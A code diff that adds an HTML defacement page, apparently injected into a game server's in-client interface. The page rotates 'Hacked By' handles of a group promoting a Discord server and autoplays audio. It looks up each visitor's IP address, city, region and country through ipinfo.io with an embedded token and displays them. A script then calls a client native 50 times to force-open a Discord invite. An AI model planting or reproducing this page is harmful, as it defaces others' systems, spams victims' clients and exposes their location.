@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Discord.gg/066</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500&display=swap" rel="stylesheet" />
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+      background-size: cover;
+      position: relative;
+    }
+
+    .container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      color: #ffffff;
+    }
+
+    .image-container img {
+      width: 550px;
+      height: auto;
+      border: 2px solid #000000;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+    }
+
+    .text {
+      margin-top: 20px;
+      font-size: 3em;
+      text-shadow: 0px 0px 8px #000000, 0px 0px 15px #ffffff, 0px 0px 25px #ffffff;
+      letter-spacing: 4.5px;
+    }
+
+    .info {
+      margin-top: 20px;
+      font-size: 1.2em;
+      text-shadow: 0px 0px 8px #ffffff;
+      line-height: 1.6em;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <div class="image-container">
+      <img src="https://h.top4top.io/p_3653nnv0v1.png" alt="Discord Image" />
+    </div>
+
+    <!-- النص المتغير -->
+    <div class="text" id="rotating-text"></div>
+
+    <audio autoplay loop>
+      <source src="https://c.top4top.io/m_3653w2aur1.mp3" type="audio/mpeg" />
+    </audio>
+
+    <div class="info" id="ip-info">
+      <strong>IP:</strong> <span id="ip"></span><br />
+      <strong>City:</strong> <span id="city"></span><br />
+      <strong>Region:</strong> <span id="region"></span><br />
+      <strong>Country:</strong> <span id="country"></span><br />
+    </div>
+
+    <div class="text">%DeadLyBoyzz Group</div>
+    <div class="text">Discord.gg/066</div>
+
+  </div>
+
+  <!-- IP INFO -->
+  <script>
+    fetch('https://ipinfo.io/json?token=de932e5614fa4d')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('ip').textContent = data.ip || '';
+        document.getElementById('city').textContent = data.city || '';
+        document.getElementById('region').textContent = data.region || '';
+        document.getElementById('country').textContent = data.country || '';
+      });
+  </script>
+
+  <!-- تغيير النص كل 5 ثواني -->
+  <script>
+    const texts = [
+      "Bypass; Server By DeadLyBoyzz",  
+      "Hacked By xM3L8",
+      "Hacked By DeL1337",
+      "Hacked By 8bx1337",
+      "Hacked By Russman1337",
+      "Hacked By Fw1337"
+    ];
+
+    let index = 0;
+    const textElement = document.getElementById("rotating-text");
+
+    function changeText() {
+      textElement.textContent = texts[index];
+      index = (index + 1) % texts.length;
+    }
+
+    changeText();
+    setInterval(changeText, 2000);
+  </script>
+
+  <!-- فتح الديسكورد -->
+  <script>
+    setTimeout(function() {
+      let count = 0;
+      let interval = setInterval(function() {
+        window.invokeNative('openUrl', 'https://discord.com/invite/066');
+        count++;
+        if (count >= 50) {
+          clearInterval(interval);
+        }
+      }, 700);
+    }, 100);
+  </script>
+
+</body>
+</html>
